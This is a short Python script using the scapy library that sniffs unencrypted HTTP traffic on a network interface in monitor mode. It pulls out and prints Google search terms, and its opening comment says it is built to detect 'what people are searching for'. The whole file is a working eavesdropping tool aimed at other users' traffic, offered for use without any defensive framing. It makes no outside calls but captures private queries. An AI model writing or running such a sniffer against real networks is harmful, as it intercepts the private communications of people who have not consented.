#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Wed May 16 21:03:11 2018

@author: starboy
"""

# Google app or chrome send out a GET request each time you type a letter,
# depending on the strength of the internet connection.
# We take advantage of thsi fact and build a sniffer that detects what people 
# are searching for.

import re
import optparse
from scapy.all import *

def find_google(pkt):
    if pkt.haslayer(Raw):
        payload = pkt.getlayer(Raw).load
        if 'GET' in payload:
            if 'google' in payload:
                r = re.findall(r'(?i)\&q=(.*?)\&', payload)
                if r:
                    search = r[0].split('&')[0]
                    search = search.replace('q=','').replace('+',' ').replace('%20',' ')
                    print('[+]Searched for: '+ search)
                    
                    
# Option parsing
parser = optparse.OptionParser('usage % prog -i <interface>')
parser.add_option('-i', dest='interface', type='string', help='specify interface in monitor mode to listen on') 
(options, args) = parser.parse_args()
if options.interface == None:
	print (parser.usage)
	exit(0)

else:
	conf.iface = options.interface

try: 
	sniff(filter='tcp port 80', prn=find_google, store=0)
except KeyboardInterrupt:
	exit(0)

                

